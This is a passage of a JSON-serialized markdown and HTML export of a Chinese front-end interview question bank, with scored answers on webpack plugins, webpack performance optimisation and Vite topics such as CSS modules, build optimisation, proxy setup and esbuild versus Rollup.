编译会创建两个核心对象:","tokens":[{"type":"strong","raw":"**5：**","text":"5：","tokens":[{"type":"text","raw":"5：","text":"5：","escaped":false}]},{"type":"text","raw":" 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务","text":" 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"webpack 编译会创建两个核心对象:","text":"webpack 编译会创建两个核心对象:","escaped":false}]}]},{"type":"list_item","raw":"- compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子\\n","task":false,"loose":false,"text":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","tokens":[{"type":"text","raw":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","text":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","tokens":[{"type":"text","raw":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","text":"compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子","escaped":false}]}]},{"type":"list_item","raw":"- compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:\\n","task":false,"loose":false,"text":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","tokens":[{"type":"text","raw":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n\\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","text":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","tokens":[{"type":"text","raw":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation","text":"compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","text":"将被创建如果自己要实现 plugin ，也需要遵循一定的规范:","escaped":false}]}]},{"type":"list_item","raw":"- 插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.\\n","task":false,"loose":false,"text":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","tokens":[{"type":"text","raw":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","text":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","tokens":[{"type":"text","raw":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","text":"插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.","escaped":false}]}]},{"type":"list_item","raw":"- 传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改\\n","task":false,"loose":false,"text":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","tokens":[{"type":"text","raw":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","text":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","tokens":[{"type":"text","raw":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","text":"传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改","escaped":false}]}]},{"type":"list_item","raw":"- 异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","task":false,"loose":false,"text":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","tokens":[{"type":"text","raw":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","text":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","tokens":[{"type":"text","raw":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","text":"异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nclass MyPlugin {\\n  // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象\\n  apply(compiler) {\\n    //找到合适的事件钩子，实现自己的插件功能\\n    compiler.hooks.emit.tap(\\"MyPlugin\\", (compilation) => {\\n      // compilation: 当前打包构建流程的上下文\\n      console.log(compilation);\\n      // do something...\\n    });\\n  }\\n}\\n```","lang":"javascript","text":"class MyPlugin {\\n  // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象\\n  apply(compiler) {\\n    //找到合适的事件钩子，实现自己的插件功能\\n    compiler.hooks.emit.tap(\\"MyPlugin\\", (compilation) => {\\n      // compilation: 当前打包构建流程的上下文\\n      console.log(compilation);\\n      // do something...\\n    });\\n  }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 说说如何借助webpack来优化前端性能?\\n\\n","depth":2,"text":"说说如何借助webpack来优化前端性能?","tokens":[{"type":"text","raw":"说说如何借助webpack来优化前端性能?","text":"说说如何借助webpack来优化前端性能?","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`w3`,`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`w3`,`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`w3`","text":"w3"},{"type":"text","raw":",","text":",","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **3：**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **3：**","task":false,"loose":false,"text":"**3：**","tokens":[{"type":"text","raw":"**3：**","text":"**3：**","tokens":[{"type":"strong","raw":"**3：**","text":"3：","tokens":[{"type":"text","raw":"3：","text":"3：","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >JS代码压缩  \\n >CSS代码压缩  \\n >Html文件代码压缩  \\n >文件大小压缩  \\n >图片压缩  \\n >Tree Shaking  \\n >代码分离  \\n >内联 chunk","tokens":[{"type":"paragraph","raw":"JS代码压缩  \\nCSS代码压缩  \\nHtml文件代码压缩  \\n文件大小压缩  \\n图片压缩  \\nTree Shaking  \\n代码分离  \\n内联 chunk","text":"JS代码压缩  \\nCSS代码压缩  \\nHtml文件代码压缩  \\n文件大小压缩  \\n图片压缩  \\nTree Shaking  \\n代码分离  \\n内联 chunk","tokens":[{"type":"text","raw":"JS代码压缩","text":"JS代码压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"CSS代码压缩","text":"CSS代码压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"Html文件代码压缩","text":"Html文件代码压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"文件大小压缩","text":"文件大小压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"图片压缩","text":"图片压缩","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"Tree Shaking","text":"Tree Shaking","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"代码分离","text":"代码分离","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"内联 chunk","text":"内联 chunk","escaped":false}]}],"text":"JS代码压缩  \\nCSS代码压缩  \\nHtml文件代码压缩  \\n文件大小压缩  \\n图片压缩  \\nTree Shaking  \\n代码分离  \\n内联 chunk"}]},{"key":"vite","content":"<h1>vite</h1>\\n<h2>Vite 如何处理 CSS 模块？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。</li>\\n</ul>\\n<h2>Vite 生产构建的主要优化策略有哪些？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。</li>\\n<li><strong>1：</strong> 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function add(a, b) {\\n    return a + b;\\n}\\n</code></pre>\\n<p>经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。</p>\\n<ul>\\n<li><p><strong>1：</strong> CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。</p>\\n</li>\\n<li><p><strong>1：</strong> 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。</p>\\n</li>\\n<li><p><strong>2：</strong> Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。</p>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在 vite.config.js 中配置 server.proxy 选项，例如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">module.exports = {\\n  server: {\\n    proxy: {\\n      &#39;/api&#39;: {\\n        target: &#39;http://backend-api-url&#39;,\\n        changeOrigin: true,\\n        rewrite: (path) =&gt; path.replace(/^\\\\/api/, &#39;&#39;)\\n      }\\n    }\\n  }\\n};\\n// 这会将所有以 /api 开头的请求代理到指定的后端 API 地址，并根据 rewrite 规则修改请求路径。\\n</code></pre>\\n<h2>Vite 在开发模式下如何实现快速启动？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。</li>\\n</ul>\\n<h2>Vite 如何支持 TypeScript？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。</li>\\n</ul>\\n<h2>Vite 与传统的 Webpack 打包工具有何不同？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。</li>\\n</ul>\\n<h2>Vite 项目构建速度快的原因是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。</li>\\n</ul>\\n<h2>esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。</p>\\n</li>\\n<li><p><strong>1：</strong> Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。</p>\\n</li>\\n<li><p><strong>1：</strong> 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# vite\\n\\n","depth":1,"text":"vite","tokens":[{"type":"text","raw":"vite","text":"vite","escaped":false}]},{"type":"heading","raw":"## Vite 如何处理 CSS 模块？\\n\\n","depth":2,"text":"Vite 如何处理 CSS 模块？","tokens":[{"type":"text","raw":"Vite 如何处理 CSS 模块？","text":"Vite 如何处理 CSS 模块？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","task":false,"loose":false,"text":"**2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","tokens":[{"type":"text","raw":"**2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","text":"**2：** Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","text":" Vite 对 CSS 模块有内置支持，会将 CSS 模块中的类名转换为唯一的哈希值，以避免全局样式冲突。并且可以通过 import 语句引入 CSS 模块，在 JavaScript 文件中使用其导出的类名对象来应用样式到相应元素。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 生产构建的主要优化策略有哪些？\\n\\n","depth":2,"text":"Vite 生产构建的主要优化策略有哪些？","tokens":[{"type":"text","raw":"Vite 生产构建的主要优化策略有哪些？","text":"Vite 生产构建的主要优化策略有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。\\n- **1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。\\n","task":false,"loose":false,"text":"**1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","tokens":[{"type":"text","raw":"**1：** 依赖预打包<br>\\n\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","text":"**1：** 依赖预打包<br>\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。<br>\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 依赖预打包","text":" 依赖预打包","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。","text":"\\n&emsp;原理：在生产构建时，Vite 会对项目的依赖进行预打包。因为在开发阶段，Vite 利用浏览器原生的 ES 模块加载，每个依赖都是单独的模块请求。但在生产环境中，过多的小模块请求会影响性能。Vite 将多个依赖模块合并为一个或几个较大的 chunk 文件，减少 HTTP 请求数量。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","text":"\\n&emsp;示例：比如一个项目使用了 lodash、axios 等多个库，Vite 会把这些库的相关模块打包到一起。假设在开发时，加载这些库可能会产生 10 个小的模块请求，经过预打包后可能只需要 1 - 2 个请求来加载这些库的代码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","task":false,"loose":false,"text":"**1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","tokens":[{"type":"text","raw":"**1：** 代码压缩与混淆:<br>\\n\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","text":"**1：** 代码压缩与混淆:<br>\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。<br>\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码压缩与混淆:","text":" 代码压缩与混淆:","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。","text":"\\n&emsp;原理： Vite 使用工具（如 Terser）对 JavaScript 代码进行压缩和混淆。压缩是去除代码中的空格、注释等冗余信息，减小文件体积。混淆则是将变量名、函数名等替换为更短或难以理解的名称，增加代码的安全性并且进一步减小体积。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","text":"\\n&emsp;示例: 原始的 JavaScript 代码可能包含大量的注释和有意义的变量名如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction add(a, b) {\\n    return a + b;\\n}\\n```","lang":"js","text":"function add(a, b) {\\n    return a + 